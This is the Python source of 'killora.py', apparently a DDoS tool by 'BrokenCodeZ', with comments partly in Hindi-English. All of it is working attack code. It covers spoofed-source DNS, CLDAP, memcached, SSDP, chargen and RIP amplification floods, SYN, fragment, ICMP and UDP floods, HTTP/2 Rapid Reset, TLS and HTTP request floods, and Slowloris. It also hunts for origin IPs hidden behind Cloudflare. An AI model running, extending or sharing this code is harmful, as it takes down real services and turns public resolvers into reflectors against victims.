#!/usr/bin/env python3
# killora.py - engine for Killora by BrokenCodeZ
import asyncio, ctypes, ipaddress, multiprocessing as mp, os, random
import resource, socket, ssl, struct, sys, time

CF_NETS = [ipaddress.ip_network(n) for n in (
    "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
    "141.101.64.0/18", "108.162.192.0/18", "190.93.240.0/20", "188.114.96.0/20",
    "197.234.240.0/22", "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
    "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22")]
CF_PORTS = [443, 2053, 2083, 2087, 2096, 8443, 80, 8080, 8880, 2052,
            2082, 2086, 2095]
TLS_PORTS = {443, 2053, 2083, 2087, 2096, 8443}
SUBS = ["direct", "origin", "origin-www", "direct-www", "ftp", "mail", "ssh",
        "cpanel", "webmail", "dev", "staging", "api", "backend", "old", "new",
        "server", "host", "portal", "admin", "vpn", "internal", "gateway"]
AMP_NAMES = ["isc.org", "ripe.net", "nic.cz", "ietf.org", "nlnetlabs.nl",
             "denic.de", "switch.ch", "nic.fr", "nominet.uk"]
RESOLVERS = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9",
             "149.112.112.112", "208.67.222.222", "208.67.220.220",
             "64.6.64.6", "64.6.65.6", "77.88.8.8", "77.88.8.1",
             "94.140.14.14", "94.140.15.15", "76.76.2.0", "76.76.10.0",
             "185.228.168.9", "185.228.169.9", "156.154.70.1", "156.154.71.1",
             "84.200.69.80", "84.200.70.40", "45.90.28.0", "45.90.30.0",
             "216.146.35.35", "216.146.36.36", "198.101.242.72",
             "23.253.163.53", "91.239.100.100", "89.233.43.71",
             "194.242.2.2", "146.112.61.106", "18.194.105.124"]
# CLDAP rootDSE - 52 byte request, 1-3 KB reply
CLDAP = bytes.fromhex(
    "3025020101632004000a01000a0100020100020100010100870b6f626a6563"
    "74636c61737330 00".replace(" ", ""))
SSDP = (b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
        b'MAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n')
MEMC = b"\x00\x00\x00\x00\x00\x01\x00\x00stats slabs\r\n"
RIP = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + b"\x00" * 12
UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Mobile Safari/537.36"]
C1 = "\033[1;36m"; C2 = "\033[1;35m"; C3 = "\033[1;33m"
C4 = "\033[1;32m"; CR = "\033[1;31m"; N = "\033[0m"
EDGE = []
LIBC = ctypes.CDLL("libc.so.6", use_errno=True)


class _IOV(ctypes.Structure):
    _fields_ = [("base", ctypes.c_void_p), ("len", ctypes.c_size_t)]


class _MSGH(ctypes.Structure):
    _fields_ = [("name", ctypes.c_void_p), ("namelen", ctypes.c_uint32),
                ("iov", ctypes.POINTER(_IOV)), ("iovlen", ctypes.c_size_t),
                ("control", ctypes.c_void_p), ("controllen", ctypes.c_size_t),
                ("flags", ctypes.c_int)]


class _MMSG(ctypes.Structure):
    _fields_ = [("hdr", _MSGH), ("len", ctypes.c_uint32)]


_MMSZ = ctypes.sizeof(_MMSG)


def prep(pkts):
    """Pre-build ctypes buffers + mmsghdr array. Ek baar, phir loop me sirf send."""
    n = len(pkts)
    bufs = [ctypes.create_string_buffer(p, len(p)) for p in pkts]
    iovs = (_IOV * n)()
    msgs = (_MMSG * n)()
    for i, b in enumerate(bufs):
        iovs[i].base = ctypes.cast(b, ctypes.c_void_p)
        iovs[i].len = len(pkts[i])
        msgs[i].hdr.iov = ctypes.cast(ctypes.byref(iovs[i]), ctypes.POINTER(_IOV))
        msgs[i].hdr.iovlen = 1
    return (bufs, iovs, msgs, n)


def blast(sock, p, chunk=64):
    """Zero-alloc send loop. syscall me 64 packet."""
    _, _, msgs, n = p
    total = 0
    for off in range(0, n, chunk):
        cnt = min(chunk, n - off)
        try:
            r = LIBC.sendmmsg(sock.fileno(),
                              ctypes.byref(msgs, off * _MMSZ), cnt, 0)
        except Exception:
            r = -1
        if r > 0:
            total += r
    return total


class Cfg:
    def __init__(self, host, port, count, dur):
        self.host = host
        self.port = port
        self.count = count
        self.sent = 0
        self.fail = 0
        self.bytes = 0
        self.ip = None
        self.origins = []
        self.stop = False
        self.t0 = time.monotonic()
        self.deadline = self.t0 + dur
        self.shared = None

    def live(self):
        return (not self.stop and time.monotonic() < self.deadline
                and (self.count == 0 or self.sent < self.count))


def is_cf(ip):
    try:
        a = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(a.version == 4 and a in n for n in CF_NETS)


def resolve(host):
    try:
        infos = socket.getaddrinfo(host, None)
    except socket.gaierror:
        return []
    out = []
    for i in infos:
        if i[4][0] not in out:
            out.append(i[4][0])
    return out


def build_edge_pool(per=160):
    for net in CF_NETS:
        base = int(net.network_address)
        for _ in range(per):
            EDGE.append(str(ipaddress.ip_address(
                base + random.randrange(1, max(net.num_addresses - 1, 2)))))


def csum(d):
    if len(d) % 2:
        d += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(d) // 2), d))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def rnd_ip():
    return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                            random.randint(0, 255), random.randint(1, 254))


def ip_hdr(src, dst, proto, total, flags=0x4000):
    h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, random.randint(0, 65535),
                     flags, random.randint(48, 128), proto, 0,
                     socket.inet_aton(src), socket.inet_aton(dst))
    return h[:10] + struct.pack("!H", csum(h)) + h[12:]


SYN_OPTS = b"\x02\x04\x05\xb4\x04\x02\x08\x0a" + b"\x00" * 8 + b"\x01\x03\x03\x07"


def tcp_pkt(src, dst, sp, dp, flags, opts=b""):
    doff = 5 + len(opts) // 4
    ip = ip_hdr(src, dst, socket.IPPROTO_TCP, 20 + doff * 4)
    tcp = struct.pack("!HHIIBBHHH", sp, dp, random.randint(0, 2**32 - 1),
                      0, doff << 4, flags, 65535, 0, 0) + opts
    ph = struct.pack("!4s4sBBH", socket.inet_aton(src), socket.inet_aton(dst),
                     0, socket.IPPROTO_TCP, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", csum(ph + tcp)) + tcp[18:]
    return ip + tcp


def udp_pkt(src, dst, sp, dp, payload, zero_csum=False):
    total = 20 + 8 + len(payload)
    ip = ip_hdr(src, dst, socket.IPPROTO_UDP, total)
    u = struct.pack("!HHHH", sp, dp, 8 + len(payload), 0) + payload
    if zero_csum:
        return ip + u
    ph = struct.pack("!4s4sBBH", socket.inet_aton(src), socket.inet_aton(dst),
                     0, socket.IPPROTO_UDP, len(u))
    u = u[:6] + struct.pack("!H", csum(ph + u)) + u[8:]
    return ip + u


def dns_pkt(src, res, name, qtype=48):
    h = struct.pack("!HHHHHH", random.randint(0, 65535), 0x0100, 1, 0, 0, 1)
    q = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"
    q += struct.pack("!HH", qtype, 1)
    q += b"\x00" + struct.pack("!HHIH", 41, 4096, 0, 0)
    return udp_pkt(src, res, 53, 53, h + q)


def frag_pkts(src, dst, dp):
    data = os.urandom(2700)
    payload = struct.pack("!HHHH", random.randint(1024, 65535), dp,
                          8 + len(data), 0) + data
    out = []
    for i in range(0, len(payload), 1400):
        chunk = payload[i:i + 1400]
        fo = (0x2000 if i == 0 else 0) | (i // 8)
        out.append(ip_hdr(src, dst, socket.IPPROTO_UDP, 20 + len(chunk), fo) + chunk)
    return out


def icmp_pkt():
    i, s, p = random.randint(0, 65535), random.randint(0, 65535), os.urandom(48)
    h = struct.pack("!BBHHH", 8, 0, 0, i, s)
    return struct.pack("!BBHHH", 8, 0, csum(h + p), i, s) + p


def client_hello(sni):
    sb = sni.encode()
    sid = os.urandom(32)
    cs = struct.pack("!HHHHHHHH", 0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f,
                     0xc030, 0xcca8, 0xcca9)
    ext = struct.pack("!HH", 0x0000, len(sb) + 5) + struct.pack("!HBH", len(sb) + 3, 0, len(sb)) + sb
    ext += struct.pack("!HH", 0x000a, 10) + struct.pack("!HHHHH", 4, 0x001d, 0x0017, 0x0018, 2) + b"\x01\x00"
    ext += struct.pack("!HH", 0x000b, 2) + b"\x01\x00"
    ext += struct.pack("!HH", 0x000d, 8) + struct.pack("!HHHH", 6, 0x0403, 0x0804, 0x0401)
    ext += struct.pack("!HH", 0x002b, 3) + b"\x02\x03\x04"
    ext += struct.pack("!HH", 0x0033, 36) + struct.pack("!HHH", 0x001d, 32, 0) + os.urandom(32)
    body = (b"\x03\x03" + os.urandom(32) + bytes([32]) + sid
            + struct.pack("!H", len(cs)) + cs + b"\x01\x00"
            + struct.pack("!H", len(ext)) + ext)
    hs = b"\x01" + struct.pack("!I", len(body))[1:] + body
    return b"\x16\x03\x01" + struct.pack("!H", len(hs)) + hs


def cf_headers():
    h = {}
    for k in ("X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP",
              "True-Client-IP", "X-Originating-IP", "Client-IP"):
        h[k] = rnd_ip()
    h["Forwarded"] = "for=" + rnd_ip()
    return h


def bust():
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=14))


def tls_ctx():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    c.set_ciphers("DEFAULT@SECLEVEL=1")
    return c


def req_bytes(host, post=False, size=0):
    m = "POST" if post else "GET"
    h = ["%s /?%s HTTP/1.1" % (m, bust()), "Host: " + host,
         "User-Agent: " + random.choice(UA), "Accept: */*",
         "Accept-Encoding: gzip, deflate, br", "Connection: keep-alive",
         "Cache-Control: no-cache", "Pragma: no-cache",
         "Referer: https://" + host + "/"]
    for k, v in cf_headers().items():
        h.append("%s: %s" % (k, v))
    if post:
        b = os.urandom(size)
        h.append("Content-Type: application/octet-stream")
        h.append("Content-Length: %d" % len(b))
        return ("\r\n".join(h) + "\r\n\r\n").encode() + b
    return ("\r\n".join(h) + "\r\n\r\n").encode()


def pick_target(cfg):
    if cfg.origins and random.random() < 0.72:
        return random.choice(cfg.origins), cfg.port
    if EDGE and random.random() < 0.92:
        return random.choice(EDGE), random.choice(CF_PORTS)
    return cfg.ip, cfg.port


def raw_sock(proto=socket.IPPROTO_RAW):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
    if proto == socket.IPPROTO_RAW:
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16 << 20)
    except OSError:
        pass
    return s


def amp_build(kind, target, n=384):
    """Pre-built amp batch. src = target (spoof), reply target pe jayegi."""
    out = []
    for _ in range(n):
        if kind == "dns":
            out.append(dns_pkt(target, random.choice(RESOLVERS),
                               random.choice(AMP_NAMES),
                               random.choice((48, 255, 16))))
        elif kind == "cldap":
            out.append(udp_pkt(target, random.choice(RESOLVERS), 389, 389, CLDAP))
        elif kind == "memcache":
            out.append(udp_pkt(target, random.choice(RESOLVERS), 11211, 11211, MEMC))
        elif kind == "ssdp":
            out.append(udp_pkt(target, random.choice(RESOLVERS), 1900, 1900, SSDP))
        elif kind == "chargen":
            out.append(udp_pkt(target, random.choice(RESOLVERS), 19, 19, b"\x00"))
        elif kind == "rip":
            out.append(udp_pkt(target, random.choice(RESOLVERS), 520, 520, RIP))
    return prep(out)


async def amp_worker(cfg, kind, cache):
    s = raw_sock()
    try:
        s.connect((cfg.ip, 0))
    except OSError:
        pass
    while cfg.live():
        n = blast(s, cache)
        cfg.sent += n
        if n == 0:
            cfg.fail += 1
        await asyncio.sleep(0)


async def syn_worker(cfg, cache):
    s = raw_sock()
    try:
        s.connect((cfg.ip, 0))
    except OSError:
        pass
    while cfg.live():
        n = blast(s, cache)
        cfg.sent += n
        await asyncio.sleep(0)


async def frag_worker(cfg):
    s = raw_sock()
    try:
        s.connect((cfg.ip, 0))
    except OSError:
        pass
    while cfg.live():
        pk = []
        for _ in range(64):
            pk.extend(frag_pkts(rnd_ip(), cfg.ip, cfg.port))
        cfg.sent += blast(s, prep(pk))
        await asyncio.sleep(0)


async def icmp_worker(cfg):
    s = raw_sock(socket.IPPROTO_ICMP)
    try:
        s.connect((cfg.ip, 0))
    except OSError:
        pass
    while cfg.live():
        cfg.sent += blast(s, prep([icmp_pkt() for _ in range(64)]))
        await asyncio.sleep(0)


async def tlshello_worker(cfg, pool):
    while cfg.live():
        ip, port = pick_target(cfg)
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), 5)
            w.write(random.choice(pool))
            cfg.sent += 1
            cfg.bytes += 300
            w.close()
        except Exception:
            cfg.fail += 1
            cfg.sent += 1


async def pipe_worker(cfg, pool, post, size):
    while cfg.live():
        ip, port = pick_target(cfg)
        ctx = tls_ctx() if port in TLS_PORTS else None
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(ip, port, ssl=ctx,
                                        server_hostname=cfg.host if ctx else None), 5)
            for _ in range(32):
                if not cfg.live():
                    break
                w.write(random.choice(pool))
                cfg.sent += 1
                cfg.bytes += 400 + (size if post else 0)
            await asyncio.wait_for(w.drain(), 5)
            w.close()
        except Exception:
            cfg.fail += 1
            cfg.sent += 1


async def h2reset_worker(cfg, host):
    """HTTP/2 Rapid Reset - stream kholo, turant RST. Bytes ~nil, server pe state banta hai."""
    import h2.connection, h2.config
    while cfg.live():
        ip, port = pick_target(cfg)
        ctx = tls_ctx()
        ctx.set_alpn_protocols(["h2"])
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(ip, port, ssl=ctx, server_hostname=host), 6)
            c = h2.connection.H2Connection(
                config=h2.config.H2Configuration(client_side=True,
                                                 header_encoding="utf-8"))
            c.initiate_connection()
            c.update_settings({h2.connection.H2Settings.MAX_CONCURRENT_STREAMS: 1000})
            w.write(c.data_to_send())
            for _ in range(200):
                if not cfg.live():
                    break
                sid = c.get_next_available_stream_id()
                c.send_headers(sid, [(":method", "POST"), (":authority", host),
                                     (":scheme", "https"), (":path", "/?" + bust()),
                                     ("content-length", "16")], end_stream=False)
                c.send_data(sid, os.urandom(16))
                c.reset_stream(sid)
                w.write(c.data_to_send())
                cfg.sent += 1
                cfg.bytes += 180
            await asyncio.wait_for(w.drain(), 6)
            w.close()
        except Exception:
            cfg.fail += 1
            cfg.sent += 1


async def h2_worker(cfg, host):
    import h2.connection, h2.config
    body = os.urandom(2048)
    while cfg.live():
        ip, port = pick_target(cfg)
        ctx = tls_ctx()
        ctx.set_alpn_protocols(["h2"])
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(ip, port, ssl=ctx, server_hostname=host), 6)
            c = h2.connection.H2Connection(
                config=h2.config.H2Configuration(client_side=True,
                                                 header_encoding="utf-8"))
            c.initiate_connection()
            w.write(c.data_to_send())
            for _ in range(24):
                if not cfg.live():
                    break
                sid = c.get_next_available_stream_id()
                c.send_headers(sid, [(":method", "POST"), (":authority", host),
                                     (":scheme", "https"), (":path", "/?" + bust()),
                                     ("content-type", "application/octet-stream"),
                                     ("content-length", str(len(body)))])
                c.send_data(sid, body)
                w.write(c.data_to_send())
                cfg.sent += 1
                cfg.bytes += 2300
            await asyncio.wait_for(w.drain(), 6)
            w.close()
        except Exception:
            cfg.fail += 1
            cfg.sent += 1


async def udp_worker(cfg):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setblocking(False)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16 << 20)
    except OSError:
        pass
    p = os.urandom(1400)
    while cfg.live():
        for _ in range(128):
            try:
                s.sendto(p, (cfg.ip, cfg.port))
                cfg.bytes += 1400
            except OSError:
                cfg.fail += 1
            cfg.sent += 1
            if not cfg.live():
                break
        await asyncio.sleep(0)


async def slow_worker(cfg):
    hb = cfg.host.encode()
    while cfg.live():
        try:
            r, w = await asyncio.open_connection(cfg.ip, cfg.port)
            w.write(b"GET /?" + bust().encode() + b" HTTP/1.1\r\nHost: " + hb +
                    b"\r\nUser-Agent: " + random.choice(UA).encode() + b"\r\n")
            await w.drain()
            cfg.sent += 1
            for _ in range(40):
                if not cfg.live():
                    break
                await asyncio.sleep(4)
                w.write(b"X-k: " + bust().encode() + b"\r\n")
                await w.drain()
            w.close()
        except Exception:
            cfg.fail += 1
            cfg.sent += 1


async def hunt(cfg):
    loop = asyncio.get_running_loop()
    for sub in SUBS:
        if cfg.stop:
            return
        try:
            ips = await loop.run_in_executor(None, resolve, "%s.%s" % (sub, cfg.host))
        except Exception:
            continue
        for ip in ips:
            if is_cf(ip) or ip in cfg.origins:
                continue
            cfg.origins.append(ip)
            print("  %s[+]%s origin %s -> %s" % (C4, N, sub, ip), flush=True)


async def maxmode(cfg, root):
    post = [req_bytes(cfg.host, True, 8192) for _ in range(128)]
    get = [req_bytes(cfg.host, False) for _ in range(128)]
    hello = [client_hello(cfg.host) for _ in range(64)]
    ht = asyncio.create_task(hunt(cfg))
    t = []
    if root:
        for kind in ("dns", "cldap", "memcache", "chargen"):
            cache = amp_build(kind, cfg.ip)
            t.append(asyncio.create_task(amp_worker(cfg, kind, cache)))
        t.append(asyncio.create_task(amp_worker(cfg, "ssdp", amp_build("ssdp", cfg.ip))))
        t.append(asyncio.create_task(syn_worker(
            cfg, prep([tcp_pkt(rnd_ip(), cfg.ip, random.randint(1024, 65535),
                               cfg.port, 0x02, SYN_OPTS) for _ in range(384)]))))
        t.append(asyncio.create_task(frag_worker(cfg)))
    for _ in range(4):
        t.append(asyncio.create_task(h2reset_worker(cfg, cfg.host)))
    for _ in range(5):
        t.append(asyncio.create_task(pipe_worker(cfg, post, True, 8192)))
    for _ in range(4):
        t.append(asyncio.create_task(tlshello_worker(cfg, hello)))
    for _ in range(3):
        t.append(asyncio.create_task(h2_worker(cfg, cfg.host)))
    for _ in range(3):
        t.append(asyncio.create_task(pipe_worker(cfg, get, False, 0)))
    await asyncio.gather(*t, return_exceptions=True)
    ht.cancel()


async def flush(cfg):
    l = [0, 0, 0]
    while not cfg.stop:
        await asyncio.sleep(0.2)
        s, f, b = cfg.shared
        with s.get_lock():
            s.value += cfg.sent - l[0]
        with f.get_lock():
            f.value += cfg.fail - l[1]
        with b.get_lock():
            b.value += cfg.bytes - l[2]
        l = [cfg.sent, cfg.fail, cfg.bytes]


def summary(cfg):
    el = time.monotonic() - cfg.t0
    print("\n  %sDONE%s sent=%d fail=%d %.1fs avg=%.0f/s %.1fMB"
          % (C4, N, cfg.sent, cfg.fail, el, cfg.sent / max(el, .01),
             cfg.bytes / 1e6), flush=True)


async def drive(cfg, worker):
    cfg.shared = (mp.Value("Q", 0), mp.Value("Q", 0), mp.Value("Q", 0))
    fl = asyncio.create_task(flush(cfg))
    await worker()
    cfg.stop = True
    await asyncio.sleep(0.3)
    fl.cancel()
    summary(cfg)


def need_root():
    if os.geteuid() != 0:
        print(CR + "  root chahiye (spoofing)" + N)
        sys.exit(1)


def child(mode, host, port, count, dur, cpu):
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (1 << 20, 1 << 20))
        if cpu is not None:
            os.sched_setaffinity(0, {cpu})
        os.nice(-10)
    except Exception:
        pass
    cfg = Cfg(host, port, count, dur)
    ips = resolve(host)
    if not ips:
        print(CR + "  resolve fail" + N, flush=True)
        return
    cfg.ip = ips[0]
    root = os.geteuid() == 0

    if mode == "max":
        asyncio.run(drive(cfg, lambda: maxmode(cfg, root)))
    elif mode in ("dnsamp", "cldapamp", "memcacheamp", "ssdpamp", "chargenamp", "ripamp"):
        kind = mode.replace("amp", "")
        cache = amp_build(kind, cfg.ip)
        asyncio.run(drive(cfg, lambda: asyncio.gather(
            *[amp_worker(cfg, kind, cache) for _ in range(4)])))
    elif mode == "syn":
        cache = prep([tcp_pkt(rnd_ip(), cfg.ip, random.randint(1024, 65535),
                              cfg.port, 0x02, SYN_OPTS) for _ in range(384)])
        asyncio.run(drive(cfg, lambda: asyncio.gather(
            *[syn_worker(cfg, cache) for _ in range(2)])))
    elif mode == "frag":
        asyncio.run(drive(cfg, lambda: asyncio.gather(
            *[frag_worker(cfg) for _ in range(2)])))
    elif mode == "icmp":
        asyncio.run(drive(cfg, lambda: asyncio.gather(
            *[icmp_worker(cfg) for _ in range(2)])))
    elif mode == "udp":
        asyncio.run(drive(cfg, lambda: asyncio.gather(
            *[udp_worker(cfg) for _ in range(2)])))
    elif mode == "tlshello":
        pool = [client_hello(host) for _ in range(64)]
        asyncio.run(drive(cfg, lambda: asyncio.gather(
            *[tlshello_worker(cfg, pool) for _ in range(300)])))
    elif mode == "h2reset":
        asyncio.run(drive(cfg, lambda: asyncio.gather(
            *[h2reset_worker(cfg, host) for _ in range(60)])))
    elif mode == "h2":
        asyncio.run(drive(cfg, lambda: asyncio.gather(
            *[h2_worker(cfg, host) for _ in range(40)])))
    elif mode == "http":
        pool = [req_bytes(host) for _ in range(192)]
        asyncio.run(drive(cfg, lambda: asyncio.gather(
            *[pipe_worker(cfg, pool, False, 0) for _ in range(300)])))
    elif mode == "slow":
        asyncio.run(drive(cfg, lambda: asyncio.gather(
            *[slow_worker(cfg) for _ in range(2)])))


def main():
    if len(sys.argv) < 7:
        sys.exit("usage: killora.py <mode> <host> <port> <count> <dur> <procs>")
    mode, host = sys.argv[1], sys.argv[2]
    port, count, dur, procs = (int(sys.argv[3]), int(sys.argv[4]),
                               int(sys.argv[5]), int(sys.argv[6]))
    print("\n  %sKILLORA MAX%s -> %s:%d mode=%s procs=%d dur=%ds\n"
          % (C2, N, host, port, mode, procs, dur))

    ips = resolve(host)
    if not ips:
        sys.exit(CR + "  resolve fail: " + host + N)

    if mode == "check":
        print("  IPs: " + ", ".join(ips))
        print("  Cloudflare: " + (CR + "YES" + N if any(is_cf(i) for i in ips) else C4 + "NO" + N))
        for sub in SUBS:
            for ip in resolve("%s.%s" % (sub, host)):
                if not is_cf(ip):
                    print("  %s[+]%s %s -> %s" % (C4, N, sub, ip))
        return

    if mode in ("max", "syn", "frag", "icmp") or mode.endswith("amp"):
        need_root()

    build_edge_pool()
    ncpu = os.cpu_count() or 1

    chunk = max(count // procs, 1) if count else 0
    jobs = []
    for i in range(procs):
        n = (chunk if i < procs - 1 else max(count - chunk * (procs - 1), 1)) if count else 0
        p = mp.Process(target=child, args=(mode, host, port, n, dur, i % ncpu))
        p.start()
        jobs.append(p)

    t0 = time.monotonic()
    try:
        while any(p.is_alive() for p in jobs):
            time.sleep(1)
            print("  %s[%5.1fs]%s %d procs live" % (C1, time.monotonic() - t0, N,
                                                    sum(p.is_alive() for p in jobs)),
                  flush=True)
    except KeyboardInterrupt:
        for p in jobs:
            p.terminate()
    for p in jobs:
        p.join()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n  interrupted")